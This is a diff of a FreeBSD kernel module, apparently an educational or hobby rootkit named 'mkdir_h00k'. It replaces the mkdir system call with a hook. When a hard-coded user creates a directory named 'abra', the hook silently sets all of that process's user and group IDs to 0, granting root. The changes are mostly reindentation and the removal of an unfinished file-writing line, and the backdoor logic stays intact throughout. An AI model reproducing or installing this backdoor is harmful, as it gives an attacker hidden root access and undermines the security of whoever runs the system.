@@ -17,62 +17,56 @@ static int
 mkdir_hook(struct thread *td, void *syscall_args)
 {
 
-	struct mkdir_args /* {
-		char 	*path;
-		int 	mode;
-	} */ *uap;
+        struct mkdir_args /* {
+                char 	*path;
+                int 	mode;
+        } */ *uap;
 
-	uap = (struct mkdir_args *) syscall_args;
+        uap = (struct mkdir_args *) syscall_args;
 
-	char path[255];
-	size_t done;
-	int error;
-	int result = 0;
+        char path[255];
+        size_t done;
+        int error;
+        int result = 0;
 
-	error = copyinstr(uap->path, path, 255, &done);
+        error = copyinstr(uap->path, path, 255, &done);
 
-	if (error != 0) {
-		return(error);
-	}
+        if (error != 0) {
+                return(error);
+        }
 
-	// printf("directory \"%s\" will be made with perms: %o\n", path, uap->mode);
-	// printf("your uid: %d %d\n", uid, td->td_ucred->cr_uid);
-	// printf("your uid: %d\n", td->td_ucred->cr_uid);
+        // printf("directory \"%s\" will be made with perms: %o\n", path, uap->mode);
+        // printf("your uid: %d %d\n", uid, td->td_ucred->cr_uid);
+        // printf("your uid: %d\n", td->td_ucred->cr_uid);
 
-	if (strcmp(path, "abra") == 0 && td->td_ucred->cr_uid == MY_UID) {
-		printf("cadabra!\n");
+        if (strcmp(path, "abra") == 0 && td->td_ucred->cr_uid == MY_UID) {
+                printf("cadabra!\n");
 
-		td->td_ucred->cr_uid = 0;	/* effective user id */
-		td->td_ucred->cr_ruid = 0;	/* real user id */
-		td->td_ucred->cr_svuid = 0;	/* saved user id */
-		td->td_ucred->cr_rgid = 0;	/* real group id */
-		td->td_ucred->cr_svgid = 0;	/* saved group id */
+                td->td_ucred->cr_uid = 0;	/* effective user id */
+                td->td_ucred->cr_ruid = 0;	/* real user id */
+                td->td_ucred->cr_svuid = 0;	/* saved user id */
+                td->td_ucred->cr_rgid = 0;	/* real group id */
+                td->td_ucred->cr_svgid = 0;	/* saved group id */
 
-// 		gid_t	cr_groups[NGROUPS];	/* groups */
-		int i;
-		for (i = 0; i < NGROUPS; i++) {
-			// printf("group %d: %d\n", i, td->td_ucred->cr_groups[i]);
-			td->td_ucred->cr_groups[i] = 0;
-		}
+                // 		gid_t	cr_groups[NGROUPS];	/* groups */
+                int i;
+                for (i = 0; i < NGROUPS; i++) {
+                        // printf("group %d: %d\n", i, td->td_ucred->cr_groups[i]);
+                        td->td_ucred->cr_groups[i] = 0;
+                }
 
-		/* extra fields to change */
-//		struct uidinfo	*cr_uidinfo;	/* per euid resource consumption */
-// 		struct uidinfo	*cr_ruidinfo;	/* per ruid resource consumption */
-		td->td_ucred->cr_uidinfo->ui_uid = 0;
-		td->td_ucred->cr_ruidinfo->ui_uid = 0;
-	} else {
-		result = mkdir(td, syscall_args);	
-	}
-
-
-	// printf("your uid: %d\n", td->td_ucred->cr_uid);
-
-	/* store string in a file */
-	kern_open(td,
+                /* extra fields to change */
+                //		struct uidinfo	*cr_uidinfo;	/* per euid resource consumption */
+                // 		struct uidinfo	*cr_ruidinfo;	/* per ruid resource consumption */
+                td->td_ucred->cr_uidinfo->ui_uid = 0;
+                td->td_ucred->cr_ruidinfo->ui_uid = 0;
+        } else {
+                result = mkdir(td, syscall_args);	
+        }
 
 
-	// return(mkdir(td, syscall_args));
-	return(result);
+        // printf("your uid: %d\n", td->td_ucred->cr_uid);
+        return(result);
 }
 
 
@@ -80,33 +74,33 @@ mkdir_hook(struct thread *td, void *syscall_args)
 static int
 load(struct module *module, int cmd, void *arg)
 {
-	int error = 0;
+        int error = 0;
 
-	switch(cmd) {
-	case MOD_LOAD:
-		/* replace read entry with read_hook */
-		sysent[SYS_mkdir].sy_call = (sy_call_t *) mkdir_hook;
-		printf("mkdir loaded\n");
-		break;
+        switch(cmd) {
+        case MOD_LOAD:
+                /* replace read entry with read_hook */
+                sysent[SYS_mkdir].sy_call = (sy_call_t *) mkdir_hook;
+                printf("mkdir loaded\n");
+                break;
 
-	case MOD_UNLOAD:
-		/* unhook */
-		sysent[SYS_mkdir].sy_call = (sy_call_t *) mkdir;
-		printf("mkdir unloaded\n");
-		break;
+        case MOD_UNLOAD:
+                /* unhook */
+                sysent[SYS_mkdir].sy_call = (sy_call_t *) mkdir;
+                printf("mkdir unloaded\n");
+                break;
 
-	default:
-		error = EOPNOTSUPP;
-		break;
-	}
-	
-	return(error);
+        default:
+                error = EOPNOTSUPP;
+                break;
+        }
+
+        return(error);
 }
 
 static moduledata_t mkdir_hook_mod = {
-	"mkdir_h00k",	/* module name */
-	load,		/* event handler */
-	NULL		/* extra data */
+        "mkdir_h00k",	/* module name */
+        load,		/* event handler */
+        NULL		/* extra data */
 };
 
 DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
@@ -129,5 +123,5 @@ DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 // 	struct mtx	*cr_mtxp;      	/* protect refcount */
 // };
 
-	//struct getuid_args uidargs = { 0 };
-	//uid_t uid= getuid(td, &uidargs);
+//struct getuid_args uidargs = { 0 };
+//uid_t uid= getuid(td, &uidargs);
